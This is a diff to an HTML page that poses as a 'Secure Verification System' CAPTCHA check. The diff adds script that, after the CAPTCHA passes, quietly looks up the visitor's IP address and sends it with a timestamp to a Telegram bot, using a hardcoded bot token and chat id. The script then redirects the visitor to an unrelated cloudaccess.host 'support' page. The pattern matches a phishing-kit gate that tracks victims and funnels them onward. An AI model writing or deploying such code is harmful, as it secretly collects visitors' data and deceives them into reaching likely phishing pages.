@@ -157,34 +157,45 @@
   <div class="footer">
     <p>© 2025 Secure Verification System. All rights reserved.</p>
   </div>
+    <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const form = document.getElementById('verificationForm');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+    const submitBtn = document.getElementById('submitBtn');
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      const form = document.getElementById('verificationForm');
-      const errorMsg = document.getElementById('errorMsg');
-      const successMsg = document.getElementById('successMsg');
-      const submitBtn = document.getElementById('submitBtn');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
 
-      form.addEventListener('submit', function (e) {
-        e.preventDefault();
+      const response = grecaptcha.getResponse();
+      if (!response) {
+        errorMsg.style.display = 'block';
+        return;
+      }
 
-        const response = grecaptcha.getResponse();
-        if (!response) {
-          errorMsg.style.display = 'block';
-          return;
-        }
+      errorMsg.style.display = 'none';
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Redirecting in 3 seconds...';
+      successMsg.style.display = 'block';
 
-        errorMsg.style.display = 'none';
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Redirecting in 3 seconds...';
+      // ✅ SEND TO TELEGRAM
+      const ipApi = 'https://api.ipify.org?format=json';
+      fetch(ipApi)
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const message = `✅ CAPTCHA Passed\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`;
+          const telegramUrl = `https://api.telegram.org/bot7826039389:AAEgkviSmkAjq8ahS_znrQOunJJT-__4kWI/sendMessage?chat_id=8117499716&text=${encodeURIComponent(message)}`;
+          fetch(telegramUrl);
+        });
 
-        successMsg.style.display = 'block';
-
-        setTimeout(() => {
-          window.location.href = "https://argenparyomnyom.cloudaccess.host/support";
-        }, 3000);
-      });
+      // ✅ REDIRECT
+      setTimeout(() => {
+        window.location.href = "https://argenparyomnyom.cloudaccess.host/support";
+      }, 3000);
     });
-  </script>
-</body>
+  });
+</script>
+
+  </body>
 </html>
